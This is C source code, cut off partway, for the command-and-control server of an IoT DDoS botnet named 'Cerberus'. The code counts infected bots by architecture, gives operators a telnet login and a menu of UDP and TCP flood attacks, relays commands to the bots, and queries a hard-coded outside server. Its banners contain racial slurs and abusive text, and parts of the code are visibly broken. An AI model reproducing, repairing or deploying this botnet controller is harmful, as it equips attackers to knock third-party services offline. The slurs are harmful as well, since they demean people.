//Made By FranceOVH Claim This Ur A Fucking Skid
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000
//cerberus V2.3 Arch-Detect Edition.                                                                                                                             
struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
	    uint32_t ip;
		char x86;
		char mips;
		char arm4;
		char arm7;
		char spc;
		char ppc;
		char sh4;
	char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int DUPESDELETED = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\033[0;38;5;218m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
				clients[events[i].data.fd].arm4 = 0;
				clients[events[i].data.fd].arm7 = 0;
				clients[events[i].data.fd].mips = 0;
				clients[events[i].data.fd].x86 = 0;
				clients[events[i].data.fd].spc = 0;
				clients[events[i].data.fd].ppc = 0;
				clients[events[i].data.fd].sh4 = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
						DUPESDELETED++;
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;
					send(infd, "~ SC ON\n", 9, MSG_NOSIGNAL);

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
				client->arm4 = 0;
				client->arm7 = 0;
				client->mips = 0;
				client->sh4 = 0;
				client->x86 = 0;
				client->spc = 0;
				client->ppc = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
							continue;
						}
										        if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mx86_64\x1b[0m ]") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mx86_32\x1b[0m ]") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mMIPS\x1b[0m ]") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mMPSL\x1b[0m ]") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "BUILD MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mSH4\x1b[0m ]") == buf)
												{
													client->sh4 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mM68K\x1b[0m ]") == buf)
												{
													client->spc = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mxIDK\x1b[0m ]") == buf)
												{
													client->sh4 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mARM4\x1b[0m ]") == buf)
												{
													client->arm4 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mARM5\x1b[0m ]") == buf)
												{
													client->arm7 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mARM6\x1b[0m ]") == buf)
												{
													client->arm7 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mARM7\x1b[0m ]") == buf)
												{
													client->arm7 = 1; 
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mppc\x1b[0m ]") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "BUILD RAZER") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "\x1b[0m[\033[0;38;5;218mcerberus\x1b[0m] \x1b[0m[ \033[0;38;5;218mSPC\x1b[0m ]") == buf)
												{
													client->spc = 1;
												}												
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf(" \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
					client->arm4 = 0;
					client->arm7 = 0;
					client->mips = 0;
					client->sh4 = 0;
					client->x86 = 0;
					client->spc = 0;
					client->ppc = 0;
					close(thefd);
				}
			}
		}
	}
}
unsigned int arm4Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm4) continue;
                total++;
        }
 
        return total;
}
unsigned int arm7Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm7) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
	int i = 0, total = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		total++;
	}

	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("User_Info.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("User_Info.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	        char cerberuslogin[25][1024];
	    sprintf(cerberuslogin[1],"\033[0;38;5;218m╔════════════════════════════════╗\r\n");
		sprintf(cerberuslogin[2],"\033[0;38;5;218m║  \033[1;32mcmon in bigdickbitch.com      \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[3],"\033[0;38;5;218m║  \033[1;32mDont talk to me if you dont   \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[4],"\033[0;38;5;218m║  \033[1;32mhave mamba no mamba = no bff  \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[5],"\033[0;38;5;218m╠════════════════════════════════╣\r\n");
		sprintf(cerberuslogin[6],"\033[0;38;5;218m║  \033[1;32mSmoke black mamba every day   \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[7],"\033[0;38;5;218m║  \033[1;32mi eat nigga ass every day     \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[8],"\033[0;38;5;218m║  \033[1;32mim going to quit              \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[9],"\033[0;38;5;218m║  \033[1;32m*smokes outside*              \033[0;38;5;218m║\r\n");
		sprintf(cerberuslogin[10],"\033[0;38;5;218m╚════════════════════════════════╝\r\n");


		
		int h;
		for(h =0;h<21;h++)
		if(send(datafd, cerberuslogin[h], strlen(cerberuslogin[h]), MSG_NOSIGNAL) == -1) goto end;
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [7000];	
		
        sprintf(user, "\033[0;38;5;218mPASSWORD:\033[0;38;5;218m\033[1;32m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [7000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\033[0;38;5;218mPASSWORD:\033[0;38;5;218m\033[1;32m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; [%d] ~ Bots  %c", '\033', clientsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;

		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
    char banner1lol1[5000];
    char banner1lol66[5000];
    char banner1lol3[5000];
    char banner1lol4[5000];
    char banner1lol5[5000];
    char banner1lol6[5000];
    char banner1lol21[5000];

    sprintf(banner1lol1, "\033[38;5;202m\033[2J\033[1;1H");
    sprintf(banner1lol66, "\033[0;38;5;218m  \r\n");   
    sprintf(banner1lol3, "\033[0;38;5;218m        [+] Help for help nigger [+]          | xoxo\r\n");                     
    sprintf(banner1lol3, "\033[0;38;5;218m   ▄▄· ▄▄▄ .▄▄▄  ▄▄▄▄· ▄▄▄ .▄▄▄  ▄• ▄▌.▄▄ ·   | Cerberus [Jack]#3490\r\n");                 
    sprintf(banner1lol4, "\033[0;38;5;218m  ▐█ ▌▪▀▄.▀·▀▄ █·▐█ ▀█▪▀▄.▀·▀▄ █·█▪██▌▐█ ▀.   | i love myself\r\n");          
    sprintf(banner1lol5, "\033[0;38;5;218m  ██ ▄▄▐▀▀▪▄▐▀▀▄ ▐█▀▀█▄▐▀▀▪▄▐▀▀▄ █▌▐█▌▄▀▀▀█▄  | <3 <3 <3\r\n");   
    sprintf(banner1lol6, "\033[0;38;5;218m  ▐███▌▐█▄▄▌▐█•█▌██▄▪▐█▐█▄▄▌▐█•█▌▐█▄█▌▐█▄▪▐█  | [\033[1;32mONLINE\033[0;38;5;218m]      \r\n");     
    sprintf(banner1lol21,"\033[0;38;5;218m  ·▀▀▀  ▀▀▀ .▀  ▀·▀▀▀▀  ▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀▀           \r\n");

    if (send(datafd, banner1lol1, strlen(banner1lol1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol66, strlen(banner1lol66), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol3, strlen(banner1lol3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol4, strlen(banner1lol4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol5, strlen(banner1lol5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol6, strlen(banner1lol6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, banner1lol21, strlen(banner1lol21), MSG_NOSIGNAL) == -1) goto end;
    
    while (1) {
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			   if(strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char cerberusExtra1  [800];
				char cerberusExtra8  [800];
				char cerberusExtra9  [800];
				char cerberusExtra11  [800];
				char cerberusExtra13  [800];
						     
				sprintf(cerberusExtra1,  "\033[0;38;5;218m╒────────────────────────────────────────╕\r\n");
				sprintf(cerberusExtra8,  "\033[0;38;5;218m│ 1: UDP - UDP HUB                       │\r\n");
				sprintf(cerberusExtra9,  "\033[0;38;5;218m│ 2: TCP - TCP HUB                       │\r\n");
				sprintf(cerberusExtra11, "\033[0;38;5;218m│ 4: BOTS - SHOWS THE TYPE OF BOTS       │\r\n");
				sprintf(cerberusExtra13, "\033[0;38;5;218m╘────────────────────────────────────────╛\r\n");                                                                                                                            

				
				
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, cerberusExtra1,  strlen(cerberusExtra1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cerberusExtra8,  strlen(cerberusExtra8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cerberusExtra9,  strlen(cerberusExtra9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cerberusExtra11,  strlen(cerberusExtra11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, cerberusExtra13,  strlen(cerberusExtra13), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if (strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char mips[128];
            char sh4[128];
            char arm4[128];
            char arm7[128];
            char ppc[128];
            char x86[128];
            char spc[128];
            char ttl[128];
			
            sprintf(mips, "\033[0;38;5;218mcerberus.mips \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",     mipsConnected());
            sprintf(arm4, "\033[0;38;5;218mcerberus.arm4 \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",   arm4Connected());
            sprintf(arm7, "\033[0;38;5;218mcerberus.arm7 \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",   arm7Connected());
            sprintf(ppc, "\033[0;38;5;218mcerberus.sh4 \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",      sh4Connected());
            sprintf(x86, "\033[0;38;5;218mcerberus.ppc \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",     ppcConnected());
            sprintf(spc, "\033[0;38;5;218mcerberus.servers \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",   x86Connected());
            sprintf(sh4, "\033[0;38;5;218mcerberus.spc \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",     spcConnected());
            sprintf(ttl, "\033[0;38;5;218mcerberus.total \x1b[0m[\033[0;38;5;218m%d\x1b[0m]\x1b[0m\r\n",  clientsConnected());
            if(send(datafd, arm4, strlen(arm4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, spc, strlen(spc), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, ppc, strlen(ppc), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, arm7, strlen(arm7), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ttl, strlen(ttl), MSG_NOSIGNAL) == -1) goto end; 

			pthread_create(&title, NULL, &TitleWriter, sock);
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}					

				if(strstr(buf, "udp") || strstr(buf, "UDP") || strstr(buf, "Udp")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char features1  [800];
				char features8  [800];
				char features9  [800];
				char features10  [800];
				char features11  [800];
				char features12  [800];
				char features13  [800];
				char features14  [800];
				char features15  [800];
				char features16  [800];
				char features17  [800];
				char features18  [800];
			    char features19  [800];
				char features20  [800];
				char features21  [800];
				char features22  [800];
						     
				sprintf(features1,  "\033[0;38;5;218m╒─────────────────────────────────────────╕\r\n");
				sprintf(features8,  "\033[0;38;5;218m│.  POXI [IP] [PORT] [TIME] [PACKETSIZE]  │\r\n");
				sprintf(features9,  "\033[0;38;5;218m│.  GAME [IP] [PORT] [TIME] [32] [1] [1]  │\r\n");
				sprintf(features10, "\033[0;38;5;218m│.  STD [IP] [PORT] [TIME]                │\r\n");
				sprintf(features11, "\033[0;38;5;218m│.  OMEGA [IP] [PORT] [TIME] [32] [1] [1] │\r\n");
				sprintf(features12, "\033[0;38;5;218m│.  STOMP [IP] [PORT] [TIME] [32] [1] [1] │\r\n");
				sprintf(features13, "\033[0;38;5;218m│.  RGAME [IP] [PORT] [TIME] [32] [1] [1] │\r\n");
				sprintf(features14, "\033[0;38;5;218m│.  FUZE  [IP] [PORT] [TIME]              │\r\n");
				sprintf(features15, "\033[0;38;5;218m╘─────────────────────────────────────────╛\r\n");
				sprintf(features16, "\033[0;38;5;218m\r\n");
				
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, features1,  strlen(features1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features8,  strlen(features8), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features9,  strlen(features9), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features10,  strlen(features10), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features11,  strlen(features11), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features12,  strlen(features12), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features13,  strlen(features13), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features14,  strlen(features14), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features15,  strlen(features15), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, features16,  strlen(features16), MSG_NOSIGNAL) == -1) goto end;

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
				if(strstr(buf, "tcp") || strstr(buf, "TCP") || strstr(buf, "Tcp")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char TCP1  [800];
				char TCP8  [800];
				char TCP9  [800];
				char TCP10  [800];
				char TCP11  [800];
				char TCP12  [800];
				char TCP13  [800];
				char TCP14  [800];
				char TCP15  [800];
						     
				sprintf(TCP1,  "\033[0;38;5;218m╒──────────────────────────────────────────────╕\r\n");
				sprintf(TCP8,  "\033[0;38;5;218m│.  ALPHA [IP] [PORT] [TIME] [32] [ALL] [1] [1]│\r\n");
				sprintf(TCP9,  "\033[0;38;5;218m│.  CRUSH [IP] [PORT] [TIME] [32] [ALL] [1] [1]│\r\n");
				sprintf(TCP10, "\033[0;38;5;218m│.  DESTROY [IP] [PORT] [TIME] [32] [1] [1]    │\r\n");
				sprintf(TCP11, "\033[0;38;5;218m╘──────────────────────────────────────────────╛\r\n");

				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, TCP1,  strlen(TCP1), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, TCP8,  strlen(TCP8), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, TCP9,  strlen(TCP9), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, TCP10,  strlen(TCP10), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, TCP11,  strlen(TCP11), MSG_NOSIGNAL) == -1) goto end;





				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				continue;
        }
			if(strstr(buf, ". STOP") || strstr(buf, ". Stop") || strstr(buf, ". stop"))
			{
				char killattack [2048];
				memset(killattack, 0, 2048);
				char killattack_msg [2048];
				
				sprintf(killattack, "\033[0;38;5;218m Stopped!\r\n");
				broadcast(killattack, datafd, "output.");
				if(send(datafd, killattack, strlen(killattack), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
		char input [7000];
		char inpue [7000];
        sprintf(input, "\033[0;38;5;218m╔═════Cerberus═══$\r\n");
        sprintf(inpue, "\033[0;38;5;218m╚═══════>\033[1;32m ");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, inpue, strlen(inpue), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
        else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "144.217.93.3"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[31m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\x1b[31;1m[IPLookup] Failed to connect to iplookup server...\x1b[31;1m\r\n", myhost);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[31m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/531m.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/531m.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[31m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\x1b[31;1m[\x1b[31;1mcerberus\x1b[31;1m] \x1b[31;1mSearching For Database -> %s...\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
